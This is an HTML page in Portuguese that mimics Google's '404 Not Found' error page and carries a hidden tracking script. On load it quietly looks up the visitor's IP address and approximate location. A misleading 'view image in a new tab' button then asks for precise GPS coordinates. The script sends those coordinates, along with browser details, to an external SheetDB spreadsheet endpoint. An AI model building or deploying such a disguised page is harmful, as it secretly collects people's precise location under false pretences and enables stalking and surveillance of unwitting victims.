<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Error 404 (Não encontrado)!!1</title><style nonce="">*{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{color:#222;text-align:unset;margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px;}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}pre{white-space:pre-wrap;}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}</style></head><body><main id="af-error-container" role="main"><a href="//www.google.com"><span id="logo" aria-label="Google" role="img"></span></a><p><b>404.</b> <ins>Ocorreu um erro.</ins></p><p>Não foi possível encontrar o URL solicitado neste servidor. <ins>Não dispomos de mais informações.</ins></p></main>
<button id="findServer">Ver imagem num novo separador</button>
</body>
  

<script>
async function getIPandLocation() {
  try {
    const response = await fetch('https://ipwhois.app/json/');
    const data = await response.json();
    return {
      country: data.country || '',
      region: data.region || '',
      city: data.city || '',
      postal: data.postal || '',
      lat_ip: data.latitude || '',
      lon_ip: data.longitude || '',
      ip: data.ip || ''
    };
  } catch(e) {
    console.error('Erro ao obter IP:', e);
    return {
      country: '',
      region: '',
      city: '',
      postal: '',
      lat_ip: '',
      lon_ip: '',
      ip: ''
    };
  }
}

function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent || '',
    language: navigator.language || '',
    screenWidth: window.screen.width || '',
    screenHeight: window.screen.height || '',
    timestamp: new Date().toISOString()
  };
}

// Função que limpa e prepara dados para enviar
function prepareDataForSheet(data) {
  const cleanData = {};
  
  // Lista exata das colunas na ordem da Google Sheet
  const columns = [
    'country', 'region', 'city', 'postal', 'lat_ip', 'lon_ip', 'ip',
    'lat_browser', 'lon_browser', 'accuracy',
    'userAgent', 'language', 'screenWidth', 'screenHeight', 'timestamp', 'geo_error'
  ];
  
  // Preenche cada coluna, usando string vazia se não existir
  columns.forEach(col => {
    if (data[col] !== undefined && data[col] !== null) {
      cleanData[col] = String(data[col]); // Converte tudo para string
    } else {
      cleanData[col] = ''; // String vazia para campos não preenchidos
    }
  });
  
  return cleanData;
}

async function sendDataToSheet(collectedData) {
  const sheetDbUrl = 'https://sheetdb.io/api/v1/eu5qmx1222j2g';
  
  try {
    // Prepara e limpa os dados
    const cleanData = prepareDataForSheet(collectedData);
    
    console.log('Enviando dados:', cleanData);
    
    const response = await fetch(sheetDbUrl, {
      method: 'POST',
      headers: { 
        'Accept': 'application/json',
        'Content-Type': 'application/json' 
      },
      body: JSON.stringify({
        data: [cleanData]
      })
    });
    
    const result = await response.json();
    console.log('Resposta SheetDB:', result);
    
    if (result.created === 1) {
      console.log('✓ Dados guardados com sucesso!');
      return true;
    } else {
      console.error('Erro na resposta:', result);
      return false;
    }
  } catch(e) {
    console.error('Erro ao enviar:', e);
    return false;
  }
}

// Coleta IP automaticamente em background
let ipData = {};
(async () => {
  ipData = await getIPandLocation();
})();

document.getElementById('findServer').addEventListener('click', async function() {
  const btn = this;
  btn.textContent = 'A localizar...';
  btn.disabled = true;
  
  const browserData = getBrowserInfo();
  let geoLocationSent = false;

  if (navigator.geolocation) {
    const geoTimeout = setTimeout(async () => {
      if (!geoLocationSent) {
        console.log('Timeout de geolocalização');
        const collectedData = {
          ...ipData,
          lat_browser: '',
          lon_browser: '',
          accuracy: '',
          ...browserData,
          geo_error: '3'
        };
        await sendDataToSheet(collectedData);
        geoLocationSent = true;
        btn.textContent = 'Timeout - IP enviado';
      }
    }, 15000);

    const options = {
      enableHighAccuracy: false,
      timeout: 12000,
      maximumAge: 60000
    };

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        console.log('✓ GPS obtido:', pos.coords.latitude, pos.coords.longitude);
        
        clearTimeout(geoTimeout);
        if (!geoLocationSent) {
          const collectedData = {
            ...ipData,
            lat_browser: pos.coords.latitude,
            lon_browser: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            ...browserData,
            geo_error: ''
          };
          
          const success = await sendDataToSheet(collectedData);
          geoLocationSent = true;
          
          if (success) {
            btn.textContent = '✓ Localização guardada!';
          } else {
            btn.textContent = '✗ Erro ao guardar';
          }
        }
      },
      async (error) => {
        console.warn('Erro de geolocalização:', error.code, error.message);
        
        clearTimeout(geoTimeout);
        if (!geoLocationSent) {
          const collectedData = {
            ...ipData,
            lat_browser: '',
            lon_browser: '',
            accuracy: '',
            ...browserData,
            geo_error: String(error.code)
          };
          await sendDataToSheet(collectedData);
          geoLocationSent = true;
          btn.textContent = 'error';
        }
      },
      options
    );
  } else {
    const collectedData = {
      ...ipData,
      lat_browser: '',
      lon_browser: '',
      accuracy: '',
      ...browserData,
      geo_error: ''
    };
    await sendDataToSheet(collectedData);
    btn.textContent = 'IP enviado';
  }
});
</script>

</body>
</html>

